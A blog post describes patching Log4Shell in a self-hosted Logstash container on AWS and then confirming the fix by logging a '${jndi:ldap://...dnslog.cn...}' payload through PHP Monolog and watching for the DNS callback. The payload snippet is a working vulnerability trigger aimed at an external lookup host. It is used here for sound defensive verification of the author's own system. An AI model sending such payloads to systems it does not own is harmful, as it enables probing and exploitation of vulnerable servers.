---
title: When Java bring problems to PHP Engineers
date: "2021-12-15T16:56:45.523Z"
description: Patching log4j on Logstash 
---

If you have read my [Elasticsearch post](https://blog.deleu.dev/el4k-my-journey-through-aws-elk-stack/)
then you may be aware that I run 4 Logstash containers on AWS to do cross-region logging.
I work alongside PHP, NodeJS & Python engineers. We have been running our ELK stack with AWS Elasticsearch
(managed) which covers Elasticsearch and Kibana and we run Logstash on Fargate. With the recent
0-day on Log4j, we first analyzed all of our stack to see if there was anything more pressing
and we concluded that we were safe. A big portion of that conclusion relied on teh fact
that our Logstash is not publicly facing and only if we attempt to log an invalid message
we could then trigger the problem. In other words, someone had to find a way to cause
our PHP system to write a log message and then that log message had to be invalid so that
Logstash would fail to process it and write it's own log message. If the final message written
by Logstash had the `${jndi:ldap://}` attack we then would be liable and that proved to be
extremely hard or flat out impossible.

With that first investigation out of the way, I went on a little playful journey on how to mitigate
the problem even further. We're in an _interesting_ position because we're not ready to migrate to
AWS OpenSearch and Elastic did not provide any patch for Logstash 7.9.3 which is the version we're
running. Elastic did, however, provided a mechanism to patch existing systems running the following
statement:

```bash
zip -q -d /logstash-patch/logstash-core/**/*/log4j-core-2.* org/apache/logging/log4j/core/lookup/JndiLookup.class
```

As you may see in [this pull request](https://github.com/cgauge/laravel-logstash-apm/pull/18/files), I
had to get creative because the Logstash Docker Image does not have zip installed. So I introduced an
intermediate image to run this and then placed the file back. Once I introduced this hoop, I felt like
I needed to get a bit of confidence that this was actually patching our Logstash, so I decided to learn
how to trigger the bug myself in order to verify that after the patch the bug would not be available
anymore.

I accomplished that by 1) creating a new EC2 instance inside our VPC, 2) installing PHP and 3) installing
monolog/monolog. I was going to write a message directly into our Logstash with a state that I know
would cause the message to fail. I did that with a code snippet similar to the following:

```php
<?php

require 'vendor/autoload.php';

$socket = new \Monolog\Handler\SocketHandler('tcp://my-logstash-internal-ip', 100);

$socket->setConnectionTimeout(1);

$socket->setFormatter(new \Monolog\Formatter\JsonFormatter);

$socket->handle([
    'special-key-that-old-cause-logstash-to-crash' => 'special-value',
    'vulnerability' => '${jndi:ldap://something.dnslog.cn/deleu}',
]);
```

As soon as I tried to write this message to Logstash, it failed to process it and wrote a log itself.
That log went into AWS CloudWatch and I could see some IP address showing up on the DNS Log service.
The IP address was not from my VPC and a bit further investigation I realized that AWS itself is
resolving the DNS and caching it, which means running the script twice would not trigger it again.
I created a new DNS Log subdomain and tested again to see it happening a 2nd time to make sure
it really was being triggered by my Logstash container. After that, I released the new version
of our Logstash with the patch provided by Elastic (removing the JndiLookup.java class) and
I could run the script and confirm that it was in fact no longer triggering any DNS lookup.

This was a roller-coaster of emotions. I definitely don't enjoy working under pressure but at the same
time it was a pressing subject given the potential vulnerability. That is why I started by looking at
the surface and looking over how easy it could be triggered from our PHP, NodeJS or Python projects.
Once I concluded that I could not do that in any way or form, I took a bit of breathing and focused on
"cheating" by spinning up a resource inside our VPC and doing a very targeted attack on our own container.
I did not truly exploit it by building an LDAP Server, but verifying the DNS resolution was being triggered
was more than enough to give me a confidence boost that the patch is perfectly safe and live.

As always, hit me up on [Twitter](https://twitter.com/deleugyn) with any
questions. 

Cheers.